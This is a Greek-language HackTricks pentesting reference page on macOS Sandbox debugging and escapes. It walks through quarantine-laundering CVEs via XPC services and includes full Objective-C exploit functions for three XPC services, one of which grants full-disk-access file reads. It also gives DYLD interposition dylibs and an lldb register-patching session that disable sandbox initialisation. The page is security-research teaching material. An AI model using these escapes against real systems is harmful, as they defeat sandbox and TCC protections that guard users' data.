# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Διαδικασία φόρτωσης του Sandbox

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Εικόνα από <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Στην προηγούμενη εικόνα είναι δυνατό να παρατηρήσουμε **πώς θα φορτωθεί το Sandbox** όταν εκτελείται μια εφαρμογή με το entitlement **`com.apple.security.app-sandbox`**.

Ο compiler θα κάνει link το `/usr/lib/libSystem.B.dylib` στο binary.

Στη συνέχεια, το **`libSystem.B`** θα καλέσει αρκετές άλλες functions, μέχρι το **`xpc_pipe_routine`** να στείλει τα entitlements της εφαρμογής στο **`securityd`**. Το Securityd ελέγχει αν η διεργασία πρέπει να τεθεί σε quarantine μέσα στο Sandbox και, αν ισχύει, θα τεθεί σε quarantine.\
Τέλος, το Sandbox θα ενεργοποιηθεί με μια κλήση στο **`__sandbox_ms`**, το οποίο θα καλέσει το **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>

## Πιθανά Bypasses

### Παράκαμψη του quarantine attribute

**Στα αρχεία που δημιουργούνται από sandboxed processes** προστίθεται το **quarantine attribute**, ώστε να αποτρέπονται τα sandbox escapes: αν αποθέσετε μια νέα εφαρμογή και προσπαθήσετε να την εκκινήσετε, το quarantine flag την σταματά. Επομένως, **αν μπορείτε να αποθέσετε ένα αρχείο ή φάκελο *χωρίς* το quarantine attribute, μπορείτε να κάνετε escape από το App Sandbox** — απλώς αποθέστε ένα `.app` bundle και εκκινήστε το με `open`, καθώς η νέα διεργασία εκτελείται υπό το LaunchServices και όχι υπό το δικό σας sandbox.

Ο αξιόπιστος τρόπος για να πετύχετε ένα **unquarantined drop** είναι να ζητήσετε από **μια άλλη διεργασία να δημιουργήσει το αρχείο για εσάς**. Όπως τεκμηριώνεται στο [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) του Mickey Jin, το **App Sandbox** επισημαίνει τα αρχεία που αποτίθενται με quarantine, αλλά οι υπηρεσίες XPC που εκτελούνται υπό το Service Sandbox δεν το κάνουν. Επομένως, αρκετές μη authenticated υπηρεσίες XPC θα μπορούσαν να χρησιμοποιηθούν ως primitive για "quarantine laundering":<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) και **CVE-2023-32414** (`ArchiveService`): κάνουν extract ένα archive που παραδόθηκε από sandboxed app σε επιλεγμένη τοποθεσία **χωρίς να μεταδώσουν το quarantine xattr** στο περιεχόμενο που έγινε extract.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): το path traversal στο `submitSignpostDataWithConfig:` επέτρεπε τη δημιουργία **αυθαίρετων directories χωρίς quarantine**, κάτι που αρκεί για τη δημιουργία ολόκληρης δομής `.app` bundle εκτός του container.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): κάνει attach ένα quarantined DMG **χωρίς να θέσει σε quarantine τη συσκευή που προκύπτει**, επομένως οι εφαρμογές στο mounted volume μπορούν να εκκινηθούν.

> [!TIP]
> Η διαδικασία του extract συνήθως **αφαιρεί το executable permission bit**. Το workaround που χρησιμοποιήθηκε στο CVE-2023-27944 ήταν η τοποθέτηση ενός **symlink** προς ένα υπάρχον signed system binary (π.χ. `/System/Library/CoreServices/Automator Application Stub`) ως το κύριο executable του bundle, το οποίο διατηρεί τη δυνατότητα εκκίνησης χωρίς να απαιτείται `+x` σε αρχείο που αποτέθηκε.

> [!CAUTION]
> Ο λόγος για τον οποίο αυτό λειτουργεί είναι ότι ο έλεγχος βασίζεται στο **flag του item που εκκινείται**: *"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*, και μόνο τότε *"it's handed over to Gatekeeper for full 'first run' security checks"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Αν δεν υπάρχει flag στο bundle που εκκινείτε, δεν υπάρχει έλεγχος από το Gatekeeper — και αυτό ακριβώς είναι το primitive που παρέχουν τα παραπάνω CVEs.<sup>[[5]](#references)</sup>
>
> Σημειώστε ότι αν ένα `.app` bundle έχει ήδη εξουσιοδοτηθεί να εκτελείται (διαθέτει quarantine xattr με ενεργοποιημένο το flag "authorized to run"), θα μπορούσατε επίσης να το κάνετε abuse... με τη διαφορά ότι πλέον δεν μπορείτε να γράψετε μέσα σε **`.app`** bundles, εκτός αν διαθέτετε κάποια privileged TCC perms (τις οποίες δεν θα έχετε μέσα σε sandbox).

### Abusing της λειτουργικότητας Open

Στα [**τελευταία παραδείγματα Word sandbox bypass**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) μπορεί να φανεί πώς θα μπορούσε να γίνει abuse της λειτουργικότητας **`open`** του cli για την παράκαμψη του sandbox.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Ακόμη και αν μια εφαρμογή **προορίζεται να εκτελείται σε sandbox** (`com.apple.security.app-sandbox`), είναι δυνατό να γίνει bypass του sandbox αν, για παράδειγμα, **εκτελείται από ένα LaunchAgent** (`~/Library/LaunchAgents`).\
Όπως εξηγείται σε [**αυτή την ανάρτηση**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), αν θέλετε να αποκτήσετε persistence με μια εφαρμογή που βρίσκεται σε sandbox, θα μπορούσατε να την κάνετε να εκτελείται αυτόματα ως LaunchAgent και ίσως να κάνετε inject malicious code μέσω DyLib environment variables.<sup>[[6]](#references)</sup>

### Abusing των Auto Start Locations

Αν μια sandboxed διεργασία μπορεί να **γράψει** σε μια τοποθεσία όπου **αργότερα θα εκτελεστεί από μια unsandboxed εφαρμογή το binary**, θα μπορεί να κάνει **escape απλώς τοποθετώντας** εκεί το binary. Καλό παράδειγμα τέτοιων τοποθεσιών είναι οι `~/Library/LaunchAgents` ή `/System/Library/LaunchDaemons`.

Για αυτό μπορεί να χρειάζονται ακόμη και **2 βήματα**: να κάνετε μια διεργασία με **πιο permissive sandbox** (`file-read*`, `file-write*`) να εκτελέσει τον κώδικά σας, ο οποίος στη συνέχεια θα γράψει σε μια τοποθεσία όπου θα **εκτελεστεί unsandboxed**.

Δείτε αυτή τη σελίδα σχετικά με τις **Auto Start locations**:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Abusing άλλων processes

Αν από τη sandboxed διεργασία μπορείτε να **κάνετε compromise σε άλλες διεργασίες** που εκτελούνται σε λιγότερο restrictive sandboxes (ή χωρίς sandbox), θα μπορείτε να κάνετε escape στα δικά τους sandboxes:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Διαθέσιμες System και User Mach services

Το Sandbox επιτρέπει επίσης την επικοινωνία με συγκεκριμένα **Mach services** μέσω XPC, τα οποία ορίζονται στο profile `application.sb`. Αν μπορείτε να κάνετε **abuse** σε μία από αυτές τις υπηρεσίες, ίσως μπορέσετε να **κάνετε escape από το sandbox**.

Όπως αναφέρεται σε [αυτό το writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), οι πληροφορίες για τα Mach services αποθηκεύονται στο `/System/Library/xpc/launchd.plist`. Είναι δυνατό να βρείτε όλα τα System και User Mach services αναζητώντας μέσα σε αυτό το αρχείο τα `<string>System</string>` και `<string>User</string>`.<sup>[[4]](#references)</sup>

Επιπλέον, είναι δυνατό να ελέγξετε αν ένα Mach service είναι διαθέσιμο σε μια sandboxed εφαρμογή καλώντας το `bootstrap_look_up`:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Διαθέσιμες PID Mach services

Αυτά τα Mach services χρησιμοποιήθηκαν αρχικά καταχρηστικά για [escape από το sandbox σε αυτό το writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). Εκείνη την εποχή, **όλα τα XPC services που απαιτούνταν** από μια εφαρμογή και το framework της ήταν ορατά στο PID domain της εφαρμογής (πρόκειται για Mach Services με `ServiceType` ως `Application`).<sup>[[4]](#references)</sup>

Για να **επικοινωνήσετε με ένα PID Domain XPC service**, αρκεί να το καταχωρίσετε μέσα στην εφαρμογή με μια γραμμή όπως η εξής:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
Επιπλέον, είναι δυνατό να βρεθούν όλες οι υπηρεσίες Mach του **Application** κάνοντας αναζήτηση μέσα στο `System/Library/xpc/launchd.plist` για το `<string>Application</string>`.

Ένας άλλος τρόπος για να βρεθούν έγκυρες υπηρεσίες xpc είναι να ελεγχθούν αυτές που βρίσκονται στο:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
Αρκετά παραδείγματα κατάχρησης αυτής της τεχνικής βρίσκονται στο [**original writeup**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), ωστόσο, τα παρακάτω είναι ορισμένα συνοπτικά παραδείγματα.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Αυτή η υπηρεσία επιτρέπει κάθε σύνδεση XPC επιστρέφοντας πάντα `YES`, ενώ η μέθοδος `runTask:arguments:withReply:` εκτελεί μια αυθαίρετη εντολή με αυθαίρετες παραμέτρους.

Το exploit ήταν «τόσο απλό όσο»:
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Αυτή η XPC service επέτρεπε κάθε client επιστρέφοντας πάντα `YES`, ενώ η μέθοδος `createZipAtPath:hourThreshold:withReply:` δεχόταν τη διαδρομή ενός φακέλου και τον συμπίεζε σε ένα αρχείο ZIP.

Επομένως, ήταν δυνατή η δημιουργία μιας πλαστής δομής φακέλων εφαρμογής, η συμπίεσή της και, στη συνέχεια, η αποσυμπίεση και εκτέλεσή της για την έξοδο από το sandbox, καθώς τα νέα αρχεία δεν θα είχαν το quarantine attribute.

Το exploit ήταν:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Αυτή η XPC service επιτρέπει την παροχή read και write access σε ένα arbitrary URL στον XPC client μέσω της μεθόδου `extendAccessToURL:completion:`, η οποία αποδεχόταν οποιαδήποτε σύνδεση. Καθώς η XPC service διαθέτει FDA, είναι δυνατή η κατάχρηση αυτών των δικαιωμάτων για την πλήρη παράκαμψη του TCC.

Το exploit ήταν:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Static Compiling & Dynamically linking

[**Αυτή η έρευνα**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) ανακάλυψε 2 τρόπους παράκαμψης του Sandbox. Επειδή το Sandbox εφαρμόζεται από το userland όταν φορτώνεται η βιβλιοθήκη **libSystem**. Αν ένα binary μπορούσε να αποφύγει τη φόρτωσή της, δεν θα γινόταν ποτέ sandboxed:<sup>[[2]](#references)</sup>

- Αν το binary είχε **πλήρως γίνει statically compiled**, θα μπορούσε να αποφύγει τη φόρτωση αυτής της βιβλιοθήκης.
- Αν το **binary δεν χρειαζόταν να φορτώσει καμία βιβλιοθήκη** (επειδή ο linker βρίσκεται επίσης στο libSystem), δεν θα χρειαζόταν να φορτώσει το libSystem.

### Shellcodes

Σημειώστε ότι ακόμη και τα **shellcodes** σε ARM64 πρέπει να γίνουν linked στο `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Περιορισμοί που δεν κληρονομούνται

Όπως εξηγείται στο **[bonus of this writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, ένας περιορισμός του sandbox όπως:<sup>[[4]](#references)</sup>
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
μπορεί να παρακαμφθεί από μια νέα διεργασία που εκτελεί, για παράδειγμα:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
Ωστόσο, φυσικά, αυτή η νέα διεργασία δεν θα κληρονομήσει entitlements ή privileges από τη γονική διεργασία.

### Entitlements

Σημειώστε ότι, ακόμη και αν ορισμένες **ενέργειες** μπορεί να **επιτρέπονται από το sandbox** όταν μια εφαρμογή διαθέτει ένα συγκεκριμένο **entitlement**, όπως στο εξής:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

Για περισσότερες πληροφορίες σχετικά με το **Interposting**, δείτε:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer` για την αποτροπή του sandbox
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Κάντε interpose το `__mac_syscall` για την αποτροπή του Sandbox
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Debug & bypass Sandbox με lldb

Let's compile an application that should be sandboxed:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Στη συνέχεια, κάντε compile την εφαρμογή:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> Η εφαρμογή θα προσπαθήσει να **διαβάσει** το αρχείο **`~/Desktop/del.txt`**, κάτι που το **Sandbox δεν θα επιτρέψει**.\
> Δημιουργήστε εκεί ένα αρχείο, καθώς μόλις γίνει bypass του Sandbox, θα μπορεί να το διαβάσει:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Ας κάνουμε debug την εφαρμογή για να δούμε πότε φορτώνεται το Sandbox:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Ακόμη και όταν έχει παρακαμφθεί το Sandbox, το TCC** θα ρωτήσει τον χρήστη αν θέλει να επιτρέψει στη διεργασία να διαβάσει αρχεία από την επιφάνεια εργασίας

## References

- [1] [Jonathan Levin - Το Apple Sandbox: Βαθύτερα στο τέλμα (διαφάνειες HITB GSEC 2016)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Διαφυγή από το Mac App Store Sandbox](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - Το Apple Sandbox: Βαθύτερα στο τέλμα (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - Μια νέα εποχή για τις διαφυγές από το macOS Sandbox](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Επεξήγηση: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): Παράκαμψη macOS TCC με το Telegram μέσω DyLib Injection (Μέρος 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
{{#include ../../../../../banners/hacktricks-training.md}}
